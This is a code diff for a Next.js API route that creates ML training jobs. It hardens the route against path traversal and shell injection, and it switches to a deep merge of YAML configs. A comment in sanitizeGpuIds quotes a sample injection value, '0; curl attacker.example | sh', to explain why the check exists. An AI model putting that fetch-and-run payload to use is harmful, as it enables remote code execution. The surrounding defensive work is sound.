@@ -3,8 +3,49 @@ import { db } from "@/lib/db";
 import { requireAuth, buildUserFilter } from "@/lib/auth";
 import { logActivity } from "@/lib/activity-log";
 import { getWorkDir } from "@/lib/frameworks";
+import { mergeYamlConfigs } from "@/lib/yaml-merge";
+import { asConfigFramework, defaultTrainingParams, parseTrainingParams, totalStepsFor } from "@/lib/training-yaml";
 import * as fs from "fs";
 import * as path from "path";
+
+/**
+ * Turn user input into a safe single path segment.
+ *
+ * `job.name` is interpolated into filesystem paths (the job config file, the
+ * output directory, and `DELETE /api/training-jobs/[id]/files`). Without this,
+ * a name of `..` resolves the job folder to its parent, and the delete-files
+ * endpoint would recursively remove the user's entire data directory.
+ */
+function toSafeSlug(input: string, fallback: string): string {
+  const slug = input
+    .replace(/\s+/g, "_")
+    .replace(/[^a-zA-Z0-9_.-]/g, "")
+    .replace(/^\.+/, "")
+    .toLowerCase()
+    .slice(0, 100);
+  return slug.length > 0 ? slug : fallback;
+}
+
+/**
+ * Validate `--gpus` input to a comma-separated list of non-negative integers.
+ *
+ * The value is interpolated into a command string that is later executed with
+ * `shell: true`, so anything else is a shell-injection vector
+ * (e.g. `"0; curl attacker.example | sh"`).
+ */
+function sanitizeGpuIds(raw: unknown): string | null {
+  const value = typeof raw === "string" && raw.trim() ? raw.trim() : "0";
+  const parts = value.split(",").map((p) => p.trim());
+  if (parts.length === 0 || parts.length > 16) return null;
+  const ids: number[] = [];
+  for (const part of parts) {
+    if (!/^\d{1,2}$/.test(part)) return null;
+    const n = Number(part);
+    if (!Number.isInteger(n) || n < 0 || n > 63) return null;
+    if (!ids.includes(n)) ids.push(n);
+  }
+  return ids.length > 0 ? ids.join(",") : null;
+}
 
 // Helper to get folder size recursively
 function getFolderSize(folderPath: string): number {
@@ -276,29 +317,44 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Generate job name and file name
-    const jobName = body.name.replace(/\s+/g, '_').replace(/[^a-zA-Z0-9_.-]/g, '').toLowerCase();
+    if (typeof body.name !== 'string' || !body.name.trim()) {
+      return NextResponse.json({ error: "Job name is required" }, { status: 400 });
+    }
+
+    // Generate job name and file name. `jobName` becomes a path segment, so it
+    // must be a safe slug (see `toSafeSlug`).
+    const jobName = toSafeSlug(body.name, `job_${Date.now()}`);
     const configFileName = `${jobName}.yml`;
 
-    // Concatenate YAMLs in order: dataset -> training config -> model config
-    const datasetYaml = dataset.yamlConfig || '';
-    const modelYaml = model.yamlConfig || '';
-    const trainingYaml = trainingConfig?.yamlConfig || '';
-    
-    // Merge YAMLs - order matters: dataset first (defines data), then training config, then model config
-    const yamlParts: string[] = [];
-    
-    if (datasetYaml) {
-      yamlParts.push(`# Dataset Configuration\n${datasetYaml}`);
+    // Deep-merge the three configs in precedence order: dataset -> training ->
+    // model (later wins on conflicts).
+    //
+    // This used to be plain text concatenation, which produced duplicate
+    // top-level keys. PyYAML tolerates that (last occurrence wins) but the
+    // document is invalid YAML, and it forced overrides to be all-or-nothing:
+    // a training config could not refine `train_dataset.transforms` without
+    // restating the whole dataset block. `mergeYamlConfigs` merges on the YAML
+    // AST so custom tags (`!COCODataSet`) survive, and falls back to the old
+    // concatenation if any source fails to parse.
+    const mergeResult = mergeYamlConfigs([
+      { label: 'Dataset Configuration', content: dataset.yamlConfig },
+      { label: 'Training Configuration', content: trainingConfig?.yamlConfig },
+      { label: 'Model Configuration', content: model.yamlConfig },
+    ]);
+    if (mergeResult.warnings.length > 0) {
+      console.warn(`[training-jobs] YAML merge warnings for "${jobName}":`, mergeResult.warnings);
     }
-    if (trainingYaml) {
-      yamlParts.push(`# Training Configuration\n${trainingYaml}`);
+    let mergedYaml = mergeResult.yaml;
+
+    if (!mergedYaml.trim()) {
+      return NextResponse.json(
+        {
+          error: "The selected dataset, model, and training config have no YAML content. " +
+            "Open each one and save it to generate its configuration first.",
+        },
+        { status: 400 }
+      );
     }
-    if (modelYaml) {
-      yamlParts.push(`# Model Configuration\n${modelYaml}`);
-    }
-    
-    let mergedYaml = yamlParts.join('\n\n');
 
     // Update save_dir to absolute path: {userDatabasePath}/{username}/jobs/{job_name}
     if (userDatabasePath && currentUser.username) {
@@ -335,9 +391,15 @@ export async function POST(request: NextRequest) {
 
     // Generate training command using absolute path
     // Always use paddle.distributed.launch --gpus for consistency with preview
-    const gpuIds = body.gpuIds || '0';
-    const useAmp = body.useAmp || false;
-    const useVdl = body.useVdl || false;
+    const gpuIds = sanitizeGpuIds(body.gpuIds);
+    if (gpuIds === null) {
+      return NextResponse.json(
+        { error: "Invalid gpuIds: expected a comma-separated list of GPU indices, e.g. \"0\" or \"0,1\"" },
+        { status: 400 }
+      );
+    }
+    const useAmp = body.useAmp === true;
+    const useVdl = body.useVdl === true;
 
     let command = '';
     let evalCommand = '';
@@ -349,9 +411,15 @@ export async function POST(request: NextRequest) {
     // Storing the absolute path in `outputDir` is what lets the checkpoints
     // API resolve `{save_dir}/best_model/model.pdparams` without any CLI
     // reparse fallback.
+    // `project.name` is free-form user input but ends up both in a filesystem
+    // path and, unquoted, inside a command string that is executed with
+    // `shell: true`. Slugify it for the same reason as `jobName`.
+    const projectSlug = toSafeSlug(project.name, 'project');
+    const defaultOutputDir = `output/${projectSlug}/${jobName}`;
+
     const segSaveDir = (userDatabasePath && currentUser.username)
       ? path.join(userDatabasePath, currentUser.username, 'jobs', jobName)
-      : `output/${project.name}/${jobName}`;
+      : defaultOutputDir;
 
     if (framework === 'PaddleSeg') {
       // PaddleSeg: save_dir is a CLI argument (the YAML has no top-level save_dir).
@@ -368,15 +436,27 @@ export async function POST(request: NextRequest) {
       command = `python -m paddle.distributed.launch --gpus ${gpuIds} tools/train.py -c ${quotedConfigPath}`;
       if (useAmp) command += ' --amp';
       if (useVdl) {
-        command += ` --use_vdl=true --vdl_log_dir=output/${project.name}/${jobName}/vdl`;
+        command += ` --use_vdl=true --vdl_log_dir=${defaultOutputDir}/vdl`;
       }
 
       // Generate eval command using absolute path
-      evalCommand = `python tools/eval.py -c ${quotedConfigPath} -o weights=output/${project.name}/${jobName}/model_final.pdparams`;
+      evalCommand = `python tools/eval.py -c ${quotedConfigPath} -o weights=${defaultOutputDir}/model_final.pdparams`;
 
       // Generate infer command (for single image inference) using absolute path
-      inferCommand = `python tools/infer.py -c ${quotedConfigPath} -o weights=output/${project.name}/${jobName}/model_final.pdparams`;
+      inferCommand = `python tools/infer.py -c ${quotedConfigPath} -o weights=${defaultOutputDir}/model_final.pdparams`;
     }
+
+    // Progress total. PaddleSeg reports iterations, the other frameworks report
+    // epochs — conflating them is why Seg jobs used to render their progress
+    // bar against a hardcoded 100 and sat at "0%" for the whole run.
+    // Read it from the merged YAML so it stays correct even when the config was
+    // hand-edited after its display columns were computed.
+    const configFramework = asConfigFramework(framework);
+    const resolvedParams = {
+      ...defaultTrainingParams(configFramework),
+      ...parseTrainingParams(configFramework, mergedYaml),
+    };
+    const totalSteps = totalStepsFor(configFramework, resolvedParams);
 
     // Create job in database with userId
     const job = await db.trainingJob.create({
@@ -386,24 +466,28 @@ export async function POST(request: NextRequest) {
         modelId: body.modelId,
         configId: body.configId || null,
         userId: userId,
-        name: body.name,
+        name: body.name.trim(),
         status: 'pending',
         command: command,
         evalCommand: evalCommand,
         inferCommand: inferCommand,
         configPath: configPath,
-        totalEpochs: trainingConfig?.epoch || 100,
+        totalEpochs: totalSteps,
         // For PaddleSeg persist the absolute save_dir so the checkpoints API
         // can locate {save_dir}/best_model/... without parsing the command.
-        outputDir: framework === 'PaddleSeg' ? segSaveDir : `output/${project.name}/${jobName}`,
-        vdlLogDir: useVdl ? `output/${project.name}/${jobName}/vdl` : null,
+        outputDir: framework === 'PaddleSeg' ? segSaveDir : `${defaultOutputDir}`,
+        vdlLogDir: useVdl ? `${defaultOutputDir}/vdl` : null,
         trainingParams: JSON.stringify({
           gpuIds,
           useAmp,
           useVdl,
-          epochs: trainingConfig?.epoch,
-          batchSize: trainingConfig?.batchSize,
-          baseLr: trainingConfig?.baseLr,
+          jobSlug: jobName,
+          framework,
+          totalSteps,
+          epochs: configFramework === 'PaddleSeg' ? undefined : resolvedParams.epochs,
+          iters: configFramework === 'PaddleSeg' ? resolvedParams.iters : undefined,
+          batchSize: resolvedParams.trainBatchSize,
+          baseLr: resolvedParams.baseLr,
         }),
         yamlConfig: mergedYaml,
       },
